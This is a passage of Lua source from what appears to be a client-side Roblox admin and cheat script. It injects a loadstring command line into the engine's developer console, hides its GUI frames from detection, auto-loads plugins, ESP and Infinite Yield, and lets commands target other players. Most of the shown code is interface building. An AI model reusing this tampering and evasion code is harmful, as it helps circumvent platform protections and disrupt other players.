	textbox.AutoLocalize = false
	textbox.ZIndex = 2

	const arrow = InstanceNew("TextLabel", commandLine)
	arrow.Name = "Arrow"
	arrow.BackgroundTransparency = 1
	arrow.Font = Enum.Font.Code
	arrow.Size = UDim2.new(0, 30, 1, 0)
	arrow.Text = "> "
	arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
	arrow.TextSize = 15
	arrow.TextXAlignment = Enum.TextXAlignment.Right
	arrow.AutoLocalize = false
	arrow.ZIndex = 2

	resetCommandLine = function()
		if commandLine.Parent then
			commandLine.Parent = nil
		end
		if textbox.Text ~= "" then
			textbox.Text = ""
		end
	end

	resetCommandLine()

	const testService = SafeGetService("TestService")

	const function getUIScaleFactor(inst)
		if NAmanage and NAmanage.GetUIScaleFactor then
			return NAmanage.GetUIScaleFactor(inst)
		end
		return 1
	end

	const function resolveLineHeight(window)
		const size = commandLine.Size
		local height = (size and size.Y and size.Y.Offset) or 0
		if height == 0 and size and size.Y and size.Y.Scale ~= 0 and window then
			height = window.AbsoluteSize.Y * size.Y.Scale
		end

		if height == 0 and commandLine.AbsoluteSize.Y > 0 then
			const scale = getUIScaleFactor(commandLine)
			if scale > 0 then
				height = commandLine.AbsoluteSize.Y / scale
			end
		end

		if height <= 0 then
			height = 30
		end

		return math.max(0, math.floor(height + 0.5))
	end

	const function adjustDevConsoleLayout(window)
		if not window then
			return
		end

		const consoleUI = window:FindFirstChild("DevConsoleUI") or window
		if commandLine.Parent ~= window then
			commandLine.Parent = window
		end

		const mainView = consoleUI and consoleUI:FindFirstChild("MainView")
		if not mainView then
			return
		end

		const lineHeight = resolveLineHeight(window)

		const targetPosition = UDim2.new(0, 0, 1, 0)
		if commandLine.Position ~= targetPosition then
			commandLine.Position = targetPosition
		end

		const windowAbs = window.AbsoluteSize
		if not baseMainViewSize then
			baseMainViewSize = mainView.Size
		elseif not lastWindowSize or windowAbs.X ~= lastWindowSize.X or windowAbs.Y ~= lastWindowSize.Y then
			baseMainViewSize = UDim2.new(
				mainView.Size.X.Scale,
				mainView.Size.X.Offset,
				mainView.Size.Y.Scale,
				mainView.Size.Y.Offset + lineHeight
			)
		end
		lastWindowSize = windowAbs

		const baseSize = baseMainViewSize
		const targetSize = UDim2.new(baseSize.X.Scale, baseSize.X.Offset, baseSize.Y.Scale, baseSize.Y.Offset - lineHeight)
		if mainView.Size ~= targetSize then
			mainView.Size = targetSize
		end
	end

	const function reportError(message)
		local filtered = tostring(message or "error")
		filtered = filtered:gsub("%[string \"console\"%]:", "console:")
		if testService then
			pcall(function()
				__lt.cm("TestService", "Error", filtered)
			end)
		else
			warn(filtered)
		end
	end

	NAlib.disconnect("naconsole_focus")
	NAlib.connect("naconsole_focus", textbox.FocusLost:Connect(function(enterPressed)
		if not enterPressed then
			return
		end
		const commandText = textbox.Text
		if commandText == "" or commandText:match("^%s*$") then
			textbox.Text = ""
			return
		end
		textbox.Text = ""
		if NAmanage.NAConsoleStructuredLog then
			NAmanage.NAConsoleStructuredLog("> "..commandText, "Output", {
				source = "NamelessAdmin";
				subsystem = "Console";
				action = "execute";
				command = commandText;
			})
		else
			print("> "..commandText)
		end

		const trimmed = commandText:match("^%s*(.-)%s*$")
		local commandLiteral = nil
		if trimmed and trimmed ~= "" then
			const firstChar = trimmed:sub(1, 1)
			if (firstChar == '"' or firstChar == "'") and trimmed:sub(-1) == firstChar then
				const literalChunk = loadstring("return "..trimmed, "console_literal")
				if literalChunk then
					local okLiteral, literalValue = pcall(literalChunk)
					if okLiteral and type(literalValue) == "string" then
						commandLiteral = literalValue
					end
				end
			end
		end

		if commandLiteral then
			ensureCommandHelpers()
			const dispatch = NAmanage._naConsoleDispatch
			if dispatch then
				local okDispatch, dispatchErr = NACaller(dispatch, commandLiteral)
				if not okDispatch then
					reportError(dispatchErr or "command execution failed")
				end
			else
				reportError("Command dispatcher unavailable")
			end
			return
		end

		local chunk, compileErr = loadstring(commandText, "console")
		if not chunk then
			reportError(compileErr or "compile error")
			return
		end

		ensureCommandHelpers()

		local ok, execErr = pcall(function()
			if not cmd or not cmd.run then
				error("cmd.run unavailable")
			end
			cmd.run({"loadstring", commandText})
		end)
		if not ok then
			reportError(execErr or "execution error")
		end
	end))

	ensureInjection = function()
		const coreGui = Services.CoreGui
		if not coreGui then
			watchConsoleRoot(nil)
			resetCommandLine()
			return false
		end
		watchConsoleRoot(coreGui)

		local state = NAmanage._rbxDevConsoleLookup
		if type(state) ~= "table" then
			state = {}
			NAmanage._rbxDevConsoleLookup = state
		end

		local master = cachedConsoleMaster
		if not (master and master.Parent and master.Name == "DevConsoleMaster") then
			master = state.master
		end
		if not (master and master.Parent and master.Name == "DevConsoleMaster") then
			master = coreGui:FindFirstChild("DevConsoleMaster")
		end
		if not master then
			watchConsoleMaster(nil)
			resetCommandLine()
			return false
		end
		state.master = master
		watchConsoleMaster(master)

		local window = cachedConsoleWindow
		if not (window and window.Parent and window.Name == "DevConsoleWindow") then
			window = state.window
		end
		if not (window and window.Parent and window.Name == "DevConsoleWindow") then
			window = master:FindFirstChild("DevConsoleWindow")
		end
		if not window or window.Visible == false then
			watchConsoleWindow(window)
			resetCommandLine()
			return false
		end
		state.window = window
		watchConsoleWindow(window)

		adjustDevConsoleLayout(window)
		if NAStuff and NAStuff.RobloxDevConsoleCopyButtonsEnabled == true then
			const target = NAStuff._rbxDevConsoleCopyTarget
			if lastCopyBindWindow ~= window or not (target and target.Parent) then
				NAmanage.bindRobloxDevConsoleCopyButtons(window, true)
				lastCopyBindWindow = window
			elseif NAStuff._rbxDevConsoleCopyRefresh then
				pcall(NAStuff._rbxDevConsoleCopyRefresh, false)
			end
		else
			NAmanage.cleanupRobloxDevConsoleCopyButtons()
		end
		return true
	end

	NAlib.disconnect("naconsole_loop")
	do
		local injectTick = 0
		consoleVisible = ensureInjection() == true
		NAlib.connect("naconsole_loop", Services.RunService.Heartbeat:Connect(function(dt)
			injectTick = injectTick + (dt or 0)
			const pollInterval = consoleVisible and 4 or 8
			if injectTick < pollInterval then
				return
			end
			injectTick = 0
			consoleVisible = ensureInjection() == true
		end))
	end

	NAmanage._naConsoleInitialized = true
	NAmanage._naConsoleFrame = commandLine
	NAmanage._naConsoleTextBox = textbox
	NAmanage._naConsoleArrow = arrow
	return true
end

NAmanage.destroyNAConsole = function()
	NAlib.disconnect("naconsole_loop")
	NAlib.disconnect("naconsole_focus")
	NAlib.disconnect("naconsole_window_visible")
	NAlib.disconnect("naconsole_window_ancestry")
	NAlib.disconnect("naconsole_master_child")
	NAlib.disconnect("naconsole_master_ancestry")
	NAlib.disconnect("naconsole_coregui_child")
	NAlib.disconnect("rbx_devconsole_copy_loop")
	NAmanage.cleanupRobloxDevConsoleCopyButtons()
	if NAmanage._naConsoleFrame then
		NAmanage._naConsoleFrame:Destroy()
	end
	NAmanage._naConsoleFrame = nil
	NAmanage._naConsoleTextBox = nil
	NAmanage._naConsoleArrow = nil
	NAmanage._naConsoleInitialized = false
end

NAmanage.applyLightingStyleAutomation = function()
	if NAStuff.LightingStyleAutomation ~= true or not Services.Lighting then
		return false
	end
	const styleName = type(NAStuff.LightingStyleAutomationStyle) == "string" and NAStuff.LightingStyleAutomationStyle or "Soft"
	const style = Enum.LightingStyle[styleName] or Enum.LightingStyle.Soft
	const ok = pcall(function()
		Services.Lighting.LightingStyle = style
	end)
	return ok == true
end

if not NAmanage._autoJumpGuardInitialized then
	NAmanage._autoJumpGuardInitialized = true
	NAmanage.applyLightingStyleAutomation()

	const function disableAutoJump(hum)
		if not hum or not hum.Parent then
			return
		end
		if hum.AutoJumpEnabled then
			hum.AutoJumpEnabled = false
		end
	end

	const function bindHumanoid(hum)
		NAlib.disconnect("na_autojump_hum")
		if not hum then
			return
		end
		disableAutoJump(hum)
		NAlib.connect("na_autojump_hum", hum:GetPropertyChangedSignal("AutoJumpEnabled"):Connect(function()
			disableAutoJump(hum)
		end))
		NAlib.connect("na_autojump_hum", hum.AncestryChanged:Connect(function(_, parent)
			if not parent then
				NAlib.disconnect("na_autojump_hum")
			end
		end))
	end

	const function bindCharacter(char)
		NAlib.disconnect("na_autojump_char_desc")
		if not char then
			bindHumanoid(nil)
			return
		end
		bindHumanoid(char:FindFirstChildOfClass("Humanoid"))
		NAlib.connect("na_autojump_char_desc", NAmanage.descAdd(char, function(inst)
			if inst and inst:IsA("Humanoid") then
				bindHumanoid(inst)
			end
		end, function(inst)
			return inst and inst:IsA("Humanoid")
		end))
		NAlib.connect("na_autojump_char_desc", char.AncestryChanged:Connect(function(_, parent)
			if not parent then
				NAlib.disconnect("na_autojump_char_desc")
			end
		end))
	end

	bindCharacter(getChar())
	NAlib.disconnect("na_autojump_char")
	NAlib.connect("na_autojump_char", LocalPlayer.CharacterAdded:Connect(bindCharacter))
end

SpawnCall(NAmanage.destroyNAConsole) -- ensure no dupes

SpawnCall(function() -- init
	if NAUIMANAGER.cmdBar then NAgui.NAProtection(NAUIMANAGER.cmdBar) end
	if NAUIMANAGER.chatLogsFrame then NAgui.NAProtection(NAUIMANAGER.chatLogsFrame) end
	--if NAUIMANAGER.NAchatFrame then NAgui.NAProtection(NAUIMANAGER.NAchatFrame) end
	if NAUIMANAGER.NAconsoleFrame then NAgui.NAProtection(NAUIMANAGER.NAconsoleFrame) end
	if NAUIMANAGER.commandsFrame then NAgui.NAProtection(NAUIMANAGER.commandsFrame) end
	if NAUIMANAGER.CommandKeybindsFrame then NAgui.NAProtection(NAUIMANAGER.CommandKeybindsFrame) end
	if NAUIMANAGER.resizeFrame then NAgui.NAProtection(NAUIMANAGER.resizeFrame) end
	if NAUIMANAGER.description then NAgui.NAProtection(NAUIMANAGER.description) end
	if NAUIMANAGER.ModalFixer then NAgui.NAProtection(NAUIMANAGER.ModalFixer) end
	if NAUIMANAGER.AUTOSCALER then NAgui.NAProtection(NAUIMANAGER.AUTOSCALER) NAUIMANAGER.AUTOSCALER.Scale = NAUIScale end
	if NAUIMANAGER.SettingsFrame then NAgui.NAProtection(NAUIMANAGER.SettingsFrame) end
	if NAUIMANAGER.WaypointFrame then NAgui.NAProtection(NAUIMANAGER.WaypointFrame) end
	if NAUIMANAGER.BindersFrame then NAgui.NAProtection(NAUIMANAGER.BindersFrame) end
	if NAUIMANAGER.PluginsFrame then NAgui.NAProtection(NAUIMANAGER.PluginsFrame) end
	if NAUIMANAGER.ExecutorFrame then NAgui.NAProtection(NAUIMANAGER.ExecutorFrame) end
	if NAUIMANAGER.NotepadFrame then NAgui.NAProtection(NAUIMANAGER.NotepadFrame) end
	if NAUIMANAGER.MusicFrame then NAgui.NAProtection(NAUIMANAGER.MusicFrame) end
	if NAUIMANAGER.ScriptHubFrame then NAgui.NAProtection(NAUIMANAGER.ScriptHubFrame) end
	if not PlrGui then PlrGui=Player:WaitForChild("PlayerGui",math.huge) end
end)

SpawnCall(function()
	if NADisableLastInput then
		Spawn(originalIO.ApplyLastInputPatch)
	end
end)

NAmanage.scheduleLoader('BindDevConsole', NAmanage.bindToDevConsole)
NAmanage.scheduleLoader('NAConsole', NAmanage.injectNAConsole)
NAmanage.scheduleLoader('DevConsoleCopyButtons', NAmanage.ensureRobloxDevConsoleCopyLoop)
NAmanage.scheduleLoader('Aliases', NAmanage.loadAliases)
NAmanage.scheduleLoader('UserButtons', function()
	if NAStuff.UserButtonsAutoLoad == false then
		return true
	end
	NAmanage.loadButtonIDS()
	return NAmanage.RenderUserButtons()
end, { requiresGui = true, retries = 5, delay = 0.4, retryOnFalse = true })
NAmanage.scheduleLoader('CmdIntegrationAutoRun', function()
	if NAStuff.CmdIntegrationAutoRun == true and NAmanage.loadCmdIntegration then
		local ok, err = NAmanage.loadCmdIntegration({ silent = true })
		if not ok then
			const msg = Format("Cmd auto-load failed: %s", tostring(err))
			if type(DebugNotif) == "function" then
				DebugNotif(msg, 3)
			else
				warn(msg)
			end
			return false
		end
	end
	return true
end, { retries = 2, delay = 0.6, retryOnFalse = true })
NAmanage.scheduleLoader('IYIntegrationAutoRun', function()
	if NAStuff.IYIntegrationAutoRun == true and NAmanage.loadIYIntegration then
		local ok, err = NAmanage.loadIYIntegration({ silent = true })
		if not ok then
			const msg = Format("Infinite Yield auto-load failed: %s", tostring(err))
			if type(DebugNotif) == "function" then DebugNotif(msg, 3) else warn(msg) end
			return false
		end
	end
	return true
end, { retries = 2, delay = 0.8, retryOnFalse = true })
NAmanage.scheduleLoader('CmdBar2AutoRun', function()
	if NAStuff.CmdBar2AutoRun == true and cmd and cmd.run then
		cmd.run({"cmdbar2"})
	end
	return true
end, { requiresGui = true, retries = 3, delay = 0.4 })
NAmanage.scheduleLoader('Plugins', function()
	NAmanage.InitPlugs()
	const silent = (NAmanage.jlCfg and NAmanage.jlCfg.PluginNotif == false) or false
	return NAmanage.LoadPlugins({ silent = silent, startup = true })
end, { retries = 4, delay = 0.5, retryOnFalse = true })
NAmanage.scheduleLoader('Waypoints', NAmanage.UpdateWaypointList, { spacing = 0.12 })
NAmanage.scheduleLoader('ESPSettings', NAmanage.LoadESPSettings, { spacing = 0.12 })

OrgDestroyHeight=NAlib.isProperty(Services.Workspace, "FallenPartsDestroyHeight") or math.huge

NAStuff.bindersList      = NAUIMANAGER.BindersList
SpawnCall(function()
	Wait(0.15)
	if not NAStuff.bindersList then
		return
	end
	local layoutOrder = 1
	for _, evName in events do
		const ev = evName
		const HEADER_H = 30

		const binderFrame = InstanceNew("Frame")
		binderFrame.Name             = ev.."Binder"
		binderFrame.Parent           = NAStuff.bindersList
		binderFrame.Size             = UDim2.new(1,0,0, HEADER_H)
		binderFrame.LayoutOrder      = layoutOrder
		binderFrame.ClipsDescendants = true
		binderFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
		const binderCorner = InstanceNew("UICorner", binderFrame)
		binderCorner.CornerRadius    = UDim.new(0, 6)
		const binderStroke = InstanceNew("UIStroke", binderFrame)
		binderStroke.Color           = Color3.fromRGB(60,60,60)
		binderStroke.Thickness       = 1

		const header = InstanceNew("TextButton")
		header.Name                   = "Header"
		header.Parent                 = binderFrame
		header.Size                   = UDim2.new(1,-30,0, HEADER_H)
		header.Position               = UDim2.new(0,0,0,0)
		header.BackgroundColor3       = Color3.fromRGB(30,30,30)
		header.AutoButtonColor        = false
		header.Font                   = Enum.Font.SourceSansSemibold
		header.TextSize               = 14
		header.TextColor3             = Color3.fromRGB(255,255,255)
		header.Text                   = ev
		const headerCorner = InstanceNew("UICorner", header)
		headerCorner.CornerRadius     = UDim.new(0, 6)
		header.MouseEnter:Connect(function() header.BackgroundColor3 = Color3.fromRGB(50,50,50) end)
		header.MouseLeave:Connect(function() header.BackgroundColor3 = Color3.fromRGB(30,30,30) end)

		const addBtn = InstanceNew("TextButton")
		addBtn.Name                    = "AddBtn"
		addBtn.Parent                  = binderFrame
		addBtn.Size                    = UDim2.new(0,30,0, HEADER_H)
		addBtn.Position                = UDim2.new(1,-30,0,0)
		addBtn.BackgroundColor3        = Color3.fromRGB(30,30,30)
		addBtn.AutoButtonColor         = false
		addBtn.Font                    = Enum.Font.SourceSansBold
		addBtn.TextSize                = 18
		addBtn.TextColor3              = Color3.fromRGB(255,255,255)
		addBtn.Text                    = "+"
		const addCorner = InstanceNew("UICorner", addBtn)
		addCorner.CornerRadius         = UDim.new(0, 6)
		addBtn.MouseEnter:Connect(function() addBtn.BackgroundColor3 = Color3.fromRGB(50,50,50) end)
		addBtn.MouseLeave:Connect(function() addBtn.BackgroundColor3 = Color3.fromRGB(30,30,30) end)

		const itemsFrame = InstanceNew("Frame")
		itemsFrame.Name                 = "Items"
		itemsFrame.Parent               = binderFrame
		itemsFrame.Position             = UDim2.new(0,0,0, HEADER_H)
		itemsFrame.Size                 = UDim2.new(1,0,0, 0)
		itemsFrame.BackgroundColor3     = Color3.fromRGB(25,25,25)
		const itemsCorner = InstanceNew("UICorner", itemsFrame)
		itemsCorner.CornerRadius        = UDim.new(0, 6)

		const uiLayout = InstanceNew("UIListLayout")
		uiLayout.SortOrder              = Enum.SortOrder.LayoutOrder
		uiLayout.Padding                = UDim.new(0,4)
		uiLayout.Parent                 = itemsFrame
		uiLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			if NAmanage.GetAttr(binderFrame, "Expanded") then
				const h = uiLayout.AbsoluteContentSize.Y + 8
				itemsFrame:TweenSize(UDim2.new(1,0,0,h), "Out", "Quint", 0.25, true)
				binderFrame:TweenSize(UDim2.new(1,0,0, HEADER_H + h), "Out", "Quint", 0.25, true)
			end
			updateCanvasSize(NAStuff.bindersList, NAUIMANAGER and NAUIMANAGER.AUTOSCALER and NAUIMANAGER.AUTOSCALER.Scale or nil)
		end)

		MouseButtonFix(header, function()
			const exp = NAmanage.GetAttr(binderFrame, "Expanded")
			NAmanage.SetAttr(binderFrame, "Expanded", not exp)
			if exp then
				itemsFrame:TweenSize(UDim2.new(1,0,0,0), "Out", "Quint", 0.25, true)
				binderFrame:TweenSize(UDim2.new(1,0,0, HEADER_H), "Out", "Quint", 0.25, true)
			else
				const h = uiLayout.AbsoluteContentSize.Y + 8
				itemsFrame:TweenSize(UDim2.new(1,0,0,h), "Out", "Quint", 0.25, true)
				binderFrame:TweenSize(UDim2.new(1,0,0, HEADER_H + h), "Out", "Quint", 0.25, true)
			end
		end)

		const function refreshItems()
			for _, child in itemsFrame:GetChildren() do
				if child.Name == "BinderItem" then
					child:Destroy()
				end
			end
			const list = Bindings[ev] or {}
			local activeCount, totalCount = NAmanage.BinderCounts(ev)
			if totalCount > 0 and activeCount ~= totalCount then
				header.Text = ev.." ("..activeCount.."/"..totalCount..")"
			else
				header.Text = ev.." ("..totalCount..")"
			end
			if #list > 0 then
				NAmanage.SetAttr(binderFrame, "Expanded", true)
				const h = uiLayout.AbsoluteContentSize.Y + 8
				itemsFrame:TweenSize(UDim2.new(1,0,0,h), "Out", "Quint", 0.25, true)
				binderFrame:TweenSize(UDim2.new(1,0,0, HEADER_H + h), "Out", "Quint", 0.25, true)
			else
				NAmanage.SetAttr(binderFrame, "Expanded", false)
				itemsFrame:TweenSize(UDim2.new(1,0,0,0), "Out", "Quint", 0.25, true)
				binderFrame:TweenSize(UDim2.new(1,0,0, HEADER_H), "Out", "Quint", 0.25, true)
			end
			for i, cmdStr in list do
				const text = NAmanage.BinderEntryText(cmdStr)
				const disabled = NAmanage.BinderEntryDisabled(cmdStr)
				const item = InstanceNew("Frame")
				item.Name               = "BinderItem"
				item.Parent             = itemsFrame
				item.Size               = UDim2.new(1,0,0,28)
				item.LayoutOrder        = i
				item.BackgroundColor3   = disabled and Color3.fromRGB(28,28,31) or Color3.fromRGB(35,35,35)
				item.BackgroundTransparency = disabled and 0.25 or 0
				const itemCorner = InstanceNew("UICorner", item)
				itemCorner.CornerRadius  = UDim.new(0, 6)

				const lbl = InstanceNew("TextLabel")
				lbl.Parent               = item
				lbl.Size                 = UDim2.new(1,-100,1,0)
				lbl.Position             = UDim2.new(0,8,0,0)
				lbl.BackgroundTransparency = 1
				lbl.Text                 = disabled and (text.." (disabled)") or text
				lbl.Font                 = Enum.Font.SourceSans
				lbl.TextSize             = 14
				lbl.TextColor3           = disabled and Color3.fromRGB(170,170,180) or Color3.fromRGB(255,255,255)
				lbl.TextXAlignment       = Enum.TextXAlignment.Left
				lbl.TextTruncate         = Enum.TextTruncate.AtEnd

				const dis = InstanceNew("TextButton")
				dis.Parent               = item
				dis.Size                 = UDim2.new(0,62,0,22)
				dis.Position             = UDim2.new(1,-90,0,3)
				dis.BorderSizePixel      = 0
				dis.BackgroundTransparency = 0.1
				dis.BackgroundColor3     = disabled and Color3.fromRGB(80,120,80) or Color3.fromRGB(184,124,54)
				dis.Text                 = disabled and "Enable" or "Disable"
				dis.Font                 = Enum.Font.SourceSansBold
				dis.TextSize             = 13
				dis.TextColor3           = Color3.fromRGB(244,244,244)
				const disCorner = InstanceNew("UICorner", dis)
				disCorner.CornerRadius   = UDim.new(0, 6)
				MouseButtonFix(dis, function()
					if NAmanage.BinderSetDisabled(ev, i, not disabled) then
						DoNotif((disabled and "Enabled" or "Disabled").." "..ev.." binding", 2)
					end
					refreshItems()
				end)

				const rem = InstanceNew("TextButton")
				rem.Parent               = item
				rem.Size                 = UDim2.new(0,20,0,20)
				rem.Position             = UDim2.new(1,-24,0,4)
				rem.BackgroundTransparency = 1
				rem.Text                 = "×"
				rem.Font                 = Enum.Font.SourceSansBold
				rem.TextSize             = 18
				rem.TextColor3           = Color3.fromRGB(255,100,100)
				MouseButtonFix(rem, function()
					table.remove(list, i)
					NAmanage.SaveBinders()
					refreshItems()
				end)
			end
		end
		MouseButtonFix(addBtn, function()
			Bindings[ev] = Bindings[ev] or {}
			const allowMe = (ev ~= "OnJoin" and ev ~= "OnLeave")

			Window({
				Title       = ev.." Target",
				Description = "Pick who this binder applies to.",
				Buttons     = (function()
					const B = {}

					Insert(B, {
						Text = "Guided Builder...",
						Callback = function()
							const function openGuidedInput(prefix, targetLabel)
								Window({
									Title = ev.." Guided Builder",
									Description = "Target: "..targetLabel.."\nAdd one or more steps with ';'.\nUse wait <seconds> between steps.\nExample: ws 100 ; wait 1 ; ws 16",
									InputField = true,
									Buttons = {{
										Text = "Add Sequence",
										Callback = function(input)
											const body = NAmanage.BinderTrim(input)
											if body == "" then
												DoNotif("Sequence cannot be empty.")
												return
											end
											const steps = NAmanage.BinderSplitSequence(body)
											if #steps == 0 then
												DoNotif("Sequence cannot be empty.")
												return
											end
											for idx, step in steps do
												if NAmanage.BinderWaitFromStep(step) == nil then
													const cmdName = step:match("^(%S+)")
													const lowerCmd = cmdName and Lower(cmdName) or nil
													if not (lowerCmd and (cmds.Commands[lowerCmd] or cmds.Aliases[lowerCmd])) then
														DoNotif("Step "..idx..": command '"..tostring(cmdName).."' not found.")
														return
													end
												end
											end
											Insert(Bindings[ev], prefix..body)
											NAmanage.SaveBinders()
											refreshItems()
										end
									}}
								})
							end

							const targetButtons = {}
							Insert(targetButtons, {
								Text = "No Selector",
								Callback = function()
									openGuidedInput("", "No Selector")
								end
							})

							if allowMe then
								Insert(targetButtons, {
									Text = "Me",
									Callback = function()
										openGuidedInput("<me> ", "Me")
									end
								})
							end

							Insert(targetButtons, {
								Text = "Others",
								Callback = function()
									openGuidedInput("<others> ", "Others")
								end
							})
							Insert(targetButtons, {
								Text = "All",
								Callback = function()
									openGuidedInput("<all> ", "All")
								end
							})
							Insert(targetButtons, {
								Text = "Friends",
								Callback = function()
									openGuidedInput("<friends> ", "Friends")
								end
							})
							Insert(targetButtons, {
								Text = "NonFriends",
								Callback = function()
									openGuidedInput("<nonfriends> ", "NonFriends")
								end
							})
							Insert(targetButtons, {
								Text = "Team",
								Callback = function()
									openGuidedInput("<team> ", "Team")
								end
							})
							Insert(targetButtons, {
								Text = "Nearest",
								Callback = function()
									openGuidedInput("<nearest> ", "Nearest")
								end
							})
							Insert(targetButtons, {
								Text = "Farthest",
								Callback = function()
									openGuidedInput("<farthest> ", "Farthest")
								end
							})
							Insert(targetButtons, {
								Text = "Random...",
								Callback = function()
									Window({
										Title = "Random Count",
										Description = "How many random players? Example: 1, 3, 5",
										InputField = true,
										Buttons = {{
											Text = "Next",
											Callback = function(n)
												n = tonumber(n) or 1
												n = math.max(1, math.floor(n))
												const prefix = "<#"..tostring(n).."> "
												openGuidedInput(prefix, "#" .. tostring(n) .. " Random")
											end
										}}
									})
								end
							})
							Insert(targetButtons, {
								Text = "Radius...",
								Callback = function()
									Window({
										Title = "Radius (studs)",
										Description = "Players within this radius of you. Example: 25",
										InputField = true,
										Buttons = {{
											Text = "Next",
											Callback = function(r)
												r = tonumber(r) or 25
												r = math.max(1, math.floor(r))
												const prefix = "<rad"..tostring(r).."> "
												openGuidedInput(prefix, "Radius "..tostring(r))
											end
										}}
									})
								end
							})
							Insert(targetButtons, {
								Text = "Team Prefix...",
								Callback = function()
									Window({
										Title = "Team Prefix",
										Description = "Example: red / blu / gua",
										InputField = true,
										Buttons = {{
											Text = "Next",
											Callback = function(prefix)
												prefix = tostring(prefix or ""):gsub("%s+", "")
												if prefix == "" then
													DoNotif("Team prefix cannot be empty.")
													return
												end
												const sel = "<%"..prefix.."> "
												openGuidedInput(sel, "Team Prefix "..prefix)
											end
										}}
									})
								end
							})
							Insert(targetButtons, {
								Text = "Specific Player...",
								Callback = function()
									Window({
										Title = "Player Name",
										Description = "Use full name or prefix. Example: coolguy / coo",
										InputField = true,
										Buttons = {{
											Text = "Next",
											Callback = function(name)
												name = tostring(name or ""):gsub("^%s+", ""):gsub("%s+$", "")
												if name == "" then
													DoNotif("Name cannot be empty.")
													return
												end
												const sel = "<player:"..name.."> "
												openGuidedInput(sel, "Player "..name)
											end
										}}
									})
								end
							})
							Insert(targetButtons, {
								Text = "UserId...",
								Callback = function()
									Window({
										Title = "UserId",
										Description = "Numbers only",
										InputField = true,
										Buttons = {{
											Text = "Next",
											Callback = function(id)
												id = tonumber(id)
												if not id then
													DoNotif("Invalid UserId.")
													return
												end
												const sel = "<id:"..tostring(id).."> "
												openGuidedInput(sel, "UserId "..tostring(id))
											end
										}}
									})
								end
							})
							Insert(targetButtons, {
								Text = "Custom Terms...",
								Callback = function()
									Window({
										Title = "Custom Terms",
										Description = "Comma-separated terms. Example: nearest,%blu,#3,group123,rad25",
										InputField = true,
										Buttons = {{
											Text = "Next",
											Callback = function(term)
												term = tostring(term or ""):gsub("%s+", "")
												if term == "" then
													DoNotif("Enter at least one term.")
													return
												end
												const sel = "<"..term.."> "
												openGuidedInput(sel, "Custom Terms")
											end
										}}
									})
								end
							})

							Window({
								Title = ev.." Guided Target",
								Description = "Pick who this sequence applies to.",
								Buttons = targetButtons
							})
						end
					})

					Insert(B, {
						Text = "No Selector",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					if allowMe then
						Insert(B, {
							Text = "Me",
							Callback = function()
								Window({
									Title = ev.." Binders",
									Description = "Enter command (target: <me>)",
									InputField = true,
									Buttons = {{
										Text = "Submit",
										Callback = function(input)
											const cmdName = input and input:match("^(%S+)")
											if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
												DoNotif("Command '"..tostring(cmdName).."' not found."); return
											end
											Insert(Bindings[ev], "<me> "..input)
											NAmanage.SaveBinders()
											refreshItems()
										end
									}}
								})
							end
						})
					end

					Insert(B, {
						Text = "Others",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <others>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<others> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "All",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <all>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<all> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Friends",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <friends>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<friends> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "NonFriends",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <nonfriends>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<nonfriends> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Team",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <team>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<team> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Nearest",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <nearest>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
